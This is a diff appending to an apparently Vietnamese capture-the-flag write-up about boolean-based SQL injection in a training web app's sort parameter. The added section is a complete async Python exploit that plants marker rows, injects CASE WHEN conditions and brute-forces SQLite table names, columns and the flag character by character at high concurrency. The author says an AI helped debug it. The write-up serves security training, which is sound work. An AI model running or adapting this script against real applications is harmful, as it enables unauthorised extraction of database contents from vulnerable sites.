@@ -87,3 +87,100 @@ Mình thử test thêm:
 hehehehe, anh em có thể thấy nếu 1=1 thì TRUE sẽ ở trên đầu, còn 1=2 thì FALSE sẽ ở trên đầu -> SQL injection dạng Boolean-based
 
 
+
+
+Mình viết logic căn bản rồi nhờ AI debug và ko ngờ viết được script khai thác cực nhanh :)) :
+
+```python
+import asyncio
+import aiohttp
+import re
+
+HOST = "https://web-ezzz-c7907f5903b7.training.bksec.vn"
+
+# Giới hạn số request đồng thời — đủ lớn để nhanh, đủ nhỏ để không nghẽn TCP
+CONCURRENCY = 80
+sem = asyncio.Semaphore(CONCURRENCY)
+
+async def compareTemplate(expr: str, i: int, oper: str, char: str):
+	return f"SUBSTRING({expr}, {i}, 1) {oper} '{char}'"
+
+async def test(session: aiohttp.ClientSession, cond: str):
+	async with sem:  # FIX: giới hạn concurrency
+		key = f'(CASE WHEN {cond} THEN date ELSE title END)'
+		async with session.get(f'{HOST}/sort?key={key}') as res:
+			html = await res.text()
+			first = re.search(r"<tbody>\s*<tr>\s*<td>([^<]+)</td>", html)
+			if not first:
+				return None
+			return first.group(1) == "111 TRUE"
+
+async def createTestEvents(session: aiohttp.ClientSession):
+	await session.post(f"{HOST}/add", data={"title": "000 FALSE", "date": "1111-11-11"})
+	await session.post(f"{HOST}/add", data={"title": "111 TRUE", "date": "0001-01-01"})
+
+async def find_char(session, expr: str, i: int, charset: str) -> str:
+	results = await asyncio.gather(
+		*[test(session, await compareTemplate(expr, i, '=', c)) for c in charset]
+	)
+	for c, ok in zip(charset, results):
+		if ok is True:
+			return c
+	return '?'
+
+async def extract(session, expr: str, charset: str) -> str:
+	length = 0
+	while await test(session, f"LENGTH({expr}) > {length}"):
+		length += 1
+
+	chars = await asyncio.gather(
+		*[find_char(session, expr, i, charset) for i in range(1, length + 1)]
+	)
+	return ''.join(chars)
+
+async def main():
+	# FIX: connector có giới hạn hợp lý thay vì limit=0
+	connector = aiohttp.TCPConnector(limit=CONCURRENCY * 2, limit_per_host=CONCURRENCY * 2)
+	timeout = aiohttp.ClientTimeout(total=30)
+	async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
+		await createTestEvents(s)
+
+		if await test(s, "1=1") == True:  print("[+] 1=1 -> True, Test passed")
+		if await test(s, "1=2") == False: print("[+] 1=2 -> False, Test passed")
+
+		charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-,~!@#$%^&*()+=[]:;?/\\|<>.\"' "
+
+		expr_tables = (
+			"(SELECT CAST(group_concat(tbl_name, '~') AS TEXT) FROM sqlite_master "
+			"WHERE type='table' AND name NOT LIKE 'sqlite_%')"
+		)
+		tables = await extract(s, expr_tables, charSet)
+		print(f"[+] tables = {tables!r}")
+
+		flag_table = next((t for t in tables.split('~') if 'flag' in t.lower()), None)
+		if flag_table is None:
+			print("[!] Không thấy bảng chứa 'flag'"); return
+
+		expr_cols = (
+			f"(SELECT CAST(group_concat(name, '~') AS TEXT) FROM pragma_table_info('{flag_table}'))"
+		)
+		cols = await extract(s, expr_cols, charSet)
+		print(f"[+] columns of {flag_table} = {cols!r}")
+
+		# Đọc cột 'flag' trước (thường chứa flag), rồi các cột còn lại
+		col_list = cols.split('~')
+		# Sắp xếp để cột 'flag' lên đầu — tránh đọc cột dài vô ích trước
+		col_list.sort(key=lambda c: (c.lower() != 'flag', c))
+
+		for col in col_list:
+			expr_data = f"(SELECT CAST(group_concat({col}, '~') AS TEXT) FROM {flag_table})"
+			val = await extract(s, expr_data, charSet)
+			print(f"[+] {flag_table}.{col} = {val!r}")
+			if '{' in val and '}' in val:
+				print(f"[***] FLAG: {val}")
+				return  # FIX: thấy flag thì dừng, khỏi đọc cột khác
+
+if __name__ == '__main__':
+	asyncio.run(main())
+```
+![[Pasted image 20261020013748.png]]
